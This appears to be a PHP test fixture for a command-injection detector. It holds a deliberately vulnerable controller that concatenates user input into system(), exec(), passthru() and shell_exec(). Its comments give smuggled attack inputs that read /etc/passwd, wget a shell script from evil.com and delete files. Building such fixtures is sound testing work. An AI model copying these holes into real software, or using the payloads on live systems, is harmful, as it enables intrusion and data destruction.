<?php
// Fixture: php-system-concat — system() with direct concatenation
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-78
// Agent: cmdi
// Pattern: User input concatenated into system(), exec(), passthru()

class FileManagerController
{
    // VULNERABLE: user-controlled filename in system() via concatenation
    // Attacker sends: POST filename=file.txt;+cat+/etc/passwd
    public function compressAction(): void
    {
        $filename = $_POST['filename'];
        $directory = '/var/www/uploads/';
        // VULNERABLE: direct concatenation into system()
        system('tar -czf ' . $directory . $filename . '.tar.gz -C ' . $directory . ' ' . $filename);
        echo json_encode(['status' => 'compressed']);
    }

    // VULNERABLE: user-controlled IP in exec() via string interpolation
    // Attacker sends: GET ?ip=8.8.8.8;+wget+http://evil.com/shell.sh+-O+/tmp/s.sh
    public function pingAction(): void
    {
        $ip = $_GET['ip'];
        $output = [];
        $returnCode = 0;
        // VULNERABLE: PHP string interpolation into exec()
        exec("ping -c 4 $ip", $output, $returnCode);
        echo json_encode([
            'reachable' => $returnCode === 0,
            'output' => implode("\n", $output),
        ]);
    }

    // VULNERABLE: user-controlled domain in passthru()
    // Attacker sends: GET ?domain=example.com;+id
    public function dnsLookupAction(): void
    {
        $domain = $_GET['domain'];
        header('Content-Type: text/plain');
        // VULNERABLE: concatenation into passthru()
        passthru('nslookup ' . $domain);
    }

    // VULNERABLE: user-controlled width/file in shell_exec()
    // Attacker sends: POST file=img.jpg";+rm+-rf+/tmp/*;+echo+"
    public function resizeAction(): void
    {
        $file = $_POST['file'];
        $width = $_POST['width'];
        $uploadDir = '/var/www/uploads/';
        // VULNERABLE: concatenation into shell_exec()
        $result = shell_exec("convert \"{$uploadDir}{$file}\" -resize {$width}x \"{$uploadDir}thumb_{$file}\"");
        echo json_encode(['status' => 'resized', 'output' => $result]);
    }
}
